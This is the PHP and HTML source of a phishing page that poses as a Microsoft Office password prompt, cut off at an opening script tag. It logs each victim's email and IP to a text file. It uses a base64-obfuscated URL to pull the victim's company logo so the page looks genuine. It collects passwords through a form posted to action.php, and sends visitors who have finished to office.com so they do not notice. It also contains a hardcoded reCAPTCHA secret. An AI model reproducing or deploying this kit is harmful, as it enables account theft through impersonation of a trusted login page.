<?php
session_start();

if (isset($_POST["g-recaptcha-response"])) {
  $response = $_POST["g-recaptcha-response"];
  $url = 'https://www.google.com/recaptcha/api/siteverify';
  $data = array(
    'secret' => '6LeGDLkfAAAAAJngl9VZRl_VxJSx7l6uYI5UB3F-',
    'response' => $response
  );
  $options = array(
    'http' => array(
      'method' => 'POST',
      'content' => http_build_query($data),
      'header' => 'Content-Type: application/x-www-form-urlencoded'
    )
  );
  $context  = stream_context_create($options);
  $verify = file_get_contents($url, false, $context);
  $captcha_success = json_decode($verify);

  if ($captcha_success->success == false) {
    header('Location: index.php');
    exit;
  }
} elseif (isset($_SESSION['time']) && isset($_SESSION['ip'])) {
} else {
  header('Location: index.php');
  exit;
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
  $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
  $ip = $_SERVER['REMOTE_ADDR'];
}


if (isset($_SESSION['time']) && isset($_SESSION['ip'])) {
  if (($_SESSION['time'] + 90 > time()) && ($ip == $_SESSION['ip'])) {

    $_SESSION['lgn'] = '1';
  } else {
    session_destroy();
    header('Location: index.php');
    exit;
  }
} else {
  $_SESSION['ip'] = $ip;
  $_SESSION['time'] = time();
  $_SESSION['lgn'] = '1';
}

if (isset($_SESSION['eml'])) {
  $email = $_SESSION['eml'];
}



if (isset($_SESSION['eml'])) {
  $email = $_SESSION['eml'];
  //	 $email = $_GET['email'];
  $contents = "\n Email: " . $email . "\n" . " IP: " . $ip . "\n";
  $file = "aAa.txt";
  file_put_contents($file, $contents, FILE_APPEND | LOCK_EX);
}
if (isset($_SESSION['codex'])) {
} else {


  if (isset($_SESSION['finished'])) {
    header("location: https://www.office.com");
  }
}

?>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Microsoft Office Center</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="images/favicon.ico" />
</head>
<style type="text/css">
.centered-modal.in {
    display: flex !important;
}

.centered-modal .modal-dialog {
    margin: auto;
}


.loader,
.wrapper {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.loader {
    width: 10vw;
}

.loader .wrapper span {
    width: 5px;
    height: 5px;
    background: #0067b8;
    display: inline-block;
    position: relative;
    margin: 0px 2px;
    border-radius: 50%;
    opacity: 0;
    animation: loading 3000ms ease-in-out infinite;
}

.loader .wrapper span:nth-child(5) {
    animation-delay: 100ms;
}

.loader .wrapper span:nth-child(4) {
    animation-delay: 200ms;
}

.loader .wrapper span:nth-child(3) {
    animation-delay: 300ms;
}

.loader .wrapper span:nth-child(2) {
    animation-delay: 400ms;
}

.loader .wrapper span:nth-child(1) {
    animation-delay: 500ms;
}

@keyframes loading {
    0% {
        transform: translateX(-350px);
        opacity: 0;
    }

    35%,
    65% {
        transform: translateX(0px);
        opacity: 1;
    }

    100% {
        transform: translateX(350px);
        opacity: 0;
    }
}
</style>

<body>

    <?php
  if (isset($email)) {
    $domain = substr(strrchr($email, "@"), 1);
    $uri = base64_decode("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8=");
    $lgx = $uri . $domain;

    $fgc = @file_get_contents($lgx);
    $emi = @imagecreatefromstring($fgc);

    if ($emi) {
      $img = $lgx;

      /*	$img = imagecreatefromstring(file_get_contents(base64_decode("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8=").$domain));
						ob_start();
						imagepng($img);
						$png = ob_get_clean();
						$uri = "data:image/png;base64," . base64_encode($png);

										$img = $uri;
										*/
    } else {
      $img = 'images/logo.svg';
    }
  } else {
    $img = 'images/logo.svg';
    $o_logo = '1';
  }
  ?>
    <div class="container-fluid full">

        <div class="centerDiv card"
            style="width: 440px;height: 400px ;border-radius: 0;padding: 44px; padding-bottom:0px;">
            <div class="card-body" style="padding:0px; padding-bottom:0px;">

                <div class='notifications top-left'></div>
                <img class="card-title" src="<?php if (isset($img)) {
                                        echo $img;
                                      } ?>" alt="Logo" <?php if ($img == 'images/logo.svg') { ?> style="max-width: 295px;
                                height: 29px;" <?php } else { ?> height="75px" <?php } ?>> <br>


                <span style="font-size: 15px;color:#000; margin:0; padding:0;"><a href="#"
                        onClick="alert('Function Disabled! Enter password to continue');" /><img height="25px"
                        src="images/arrow.JPG"
                        title="Arrow Backwards" /></a><?php if (isset($email)) {
                                                                                                                                                                                                                                  echo $email;
                                                                                                                                                                                                                                } ?></span>

                <p style="color:red; font-size: 14px;"> <?php if (isset($_SESSION['county'])) { ?> Sign in attempt
                    timeout, verify your password <?php } ?></p>

                <form name="login" action="action.php" method="post" enctype='multipart/form-data'>
                    <h5 class="card-title" style="font-size: 1.5rem;">Enter Password</h5>
                    <input type="password" name="password" id="i0116" maxlength="113" lang="en" class="input" required
                        placeholder="Password" aria-label="Enter your account password.">
                    <input type="hidden" name="email" value="<?php if (isset($email)) {
                                                      echo $email;
                                                    } ?>">
                    <div class="row" style="margin-top:5px;">

                        <span class="card-text" style="font-size: 10px;margin-left:15px;color: black">Sign in to
                            continue</span>
                    </div>


                    <input type="submit" class="buttond"
                        style="float: right;margin-top: 5px; font-size:12px; font-weight:700;" value=" Next">
            </div>
        </div>


        <div class="footer">
            <div class="float-right">
                <span>©2021 Microsoft</span>
                <span><a href="#" class="a-bottom">Terms of use</a></span>
                <span><a href="#" class="a-bottom">Privacy & cookies</a></span>
                <span style="margin-right:25px"><img src="images/ellipsis_white.svg"></span>
            </div>
        </div>


        <div id="myElem" class="centerDiv card"
            style="width: 440px;height: 400px ;border-radius: 0;padding: 44px; padding-bottom:0px;">
            <div class="card-body" style="padding:0px; padding-bottom:0px;">
                <div class='notifications top-left'>
                </div>
                <img class="card-title" src="<?php if (isset($img)) {
                                        echo $img;
                                      } ?>" alt="Logo" <?php if ($img == 'images/logo.svg') { ?> style="max-width: 295px;
                                height: 29px;" <?php } else { ?> height="75px" <?php } ?>> <br>
                <h3 style="font-family:Tahoma, Geneva, sans-serif;"> Validation successful, you are now being
                    redirected....</h3><br>

                <div class="loader">
                    <div class="wrapper">
                        <span></span>
                        <span></span>
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.2.js"></script>

    <script type="text/javascript">